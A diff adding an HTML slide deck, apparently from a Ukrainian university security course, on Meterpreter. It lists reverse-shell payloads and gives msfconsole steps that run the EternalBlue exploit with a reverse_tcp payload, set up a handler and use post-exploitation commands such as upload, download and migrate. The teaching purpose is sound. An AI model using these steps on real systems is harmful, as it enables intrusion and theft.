@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Тема 9.2 — Meterpreter: архітектура та основи</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/slides.css">
+</head>
+<body data-lecture="9">
+  <div class="slide-deck">
+
+    <section class="slide active title-slide">
+      <h1>Meterpreter: архітектура та основи</h1>
+      <div class="subtitle">Тема 9.2 — Пост-експлуатація та Meterpreter</div>
+      <p>Кафедра ТЕІБ, Ужгородський національний університет</p>
+    </section>
+
+    <section class="slide">
+      <h2>Архітектура Meterpreter</h2>
+
+      <div class="info-box" style="margin-bottom: 1.5rem;">
+        <strong>Meterpreter</strong> (Meta-Interpreter) — розширена оболонка Metasploit, що працює <strong class="highlight">повністю в пам'яті</strong>, шифрує трафік (TLS) та не залишає слідів на диску.
+      </div>
+
+      <div class="flow-row" style="margin: 1rem 0;">
+        <div class="flow-step"><div class="step-title">Stager</div></div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-step"><div class="step-title">TCP/HTTPS</div></div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-step"><div class="step-title">Stage (DLL)</div></div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-step"><div class="step-title">In-Memory</div></div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-step"><div class="step-title">Extensions</div></div>
+      </div>
+
+      <div class="two-column" style="margin-top: 1.5rem;">
+        <div class="column">
+          <div class="card-green">
+            <h3>Переваги над cmd/bash</h3>
+            <ul style="font-size: 0.82em; margin-top: 0.8rem; line-height: 1.6;">
+              <li><strong>In-Memory</strong> — немає файлу на диску</li>
+              <li><strong>TLS encryption</strong> — шифрований канал</li>
+              <li><strong>Extensible</strong> — модулі на льоту</li>
+              <li><strong>Migration</strong> — переміщення між процесами</li>
+              <li><strong>Multi-channel</strong> — shell + forward + file</li>
+            </ul>
+          </div>
+        </div>
+        <div class="column">
+          <div class="card-purple">
+            <h3>Основні payload'и</h3>
+            <div class="code-block" style="margin-top: 0.8rem; font-size: 0.68em;">
+windows/meterpreter/reverse_tcp
+windows/x64/meterpreter/reverse_tcp
+windows/meterpreter/reverse_https
+linux/x86/meterpreter/reverse_tcp
+python/meterpreter/reverse_tcp
+php/meterpreter/reverse_tcp
+java/meterpreter/reverse_tcp
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="slide">
+      <h2>Отримання сесії та базові команди</h2>
+
+      <div class="card-blue" style="margin-bottom: 1.5rem;">
+        <h3>Отримання Meterpreter</h3>
+        <div class="code-block" style="margin-top: 0.8rem; font-size: 0.72em;">
+# Через exploit
+msf6&gt; use exploit/windows/smb/ms17_010_eternalblue
+msf6&gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6&gt; set LHOST 192.168.1.50
+msf6&gt; exploit
+meterpreter&gt;
+
+# Апгрейд shell → Meterpreter
+msf6&gt; sessions -u 1
+
+# Через handler (для msfvenom payload)
+msf6&gt; use exploit/multi/handler
+msf6&gt; set PAYLOAD windows/meterpreter/reverse_tcp
+msf6&gt; exploit -j
+        </div>
+      </div>
+
+      <table class="comparison-table" style="font-size: 0.8em;">
+        <thead>
+          <tr><th>Категорія</th><th>Команда</th><th>Опис</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><strong>Система</strong></td><td><code>sysinfo</code></td><td>ОС, архітектура, домен</td></tr>
+          <tr><td><strong>Користувач</strong></td><td><code>getuid</code></td><td>Поточний користувач</td></tr>
+          <tr><td><strong>Файли</strong></td><td><code>ls, cd, upload, download</code></td><td>Файлова система</td></tr>
+          <tr><td><strong>Мережа</strong></td><td><code>ipconfig, route, portfwd</code></td><td>Мережева інформація</td></tr>
+          <tr><td><strong>Процеси</strong></td><td><code>ps, migrate, kill</code></td><td>Управління процесами</td></tr>
+          <tr><td><strong>Сесія</strong></td><td><code>background, exit, help</code></td><td>Управління сесією</td></tr>
+        </tbody>
+      </table>
+    </section>
+
+  </div>
+  <div class="slide-counter" id="counter"></div>
+  <div class="slide-progress" id="progress"></div>
+  <div class="controls">
+    <button id="btn-prev" onclick="prev()">&#8592;</button>
+    <button id="btn-next" onclick="next()">&#8594;</button>
+  </div>
+  <script src="../../js/slides.js"></script>
+</body>
+</html>
